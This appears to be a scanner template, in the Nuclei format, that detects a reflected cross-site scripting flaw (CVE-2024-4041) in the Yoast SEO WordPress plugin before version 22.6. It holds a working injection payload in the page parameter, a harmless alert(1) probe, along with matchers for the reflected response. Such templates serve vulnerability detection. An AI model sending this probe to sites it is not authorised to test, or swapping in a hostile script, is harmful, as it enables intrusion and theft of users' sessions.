id: yoast-seo-reflected-xss
info:
  name: Yoast SEO < 22.6 - Reflected Cross-Site Scripting (XSS)
  author: Dikshant Singh
  severity: high
  description: Reflected XSS vulnerability in Yoast SEO versions < 22.6, allowing arbitrary JavaScript execution via the `?page=` parameter.
  reference:
    - https://wpscan.com/vulnerability/6eb8e01b-0bc6-4ca9-b489-38f2a94c2909
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4041
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/4e04b161-3cd0-454d-869c-56f42bd8afb0
  verified: true
  tags: wordpress, yoast, xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?page=%22+onmouseover%3D%22alert%281%29"

    matchers:
      - type: word
        part: body
        words:
          - '<div onmouseover="alert(1)"'

      - type: regex
        part: headers
        regex:
          - "Content-Type: text/html"

    matchers-condition: and
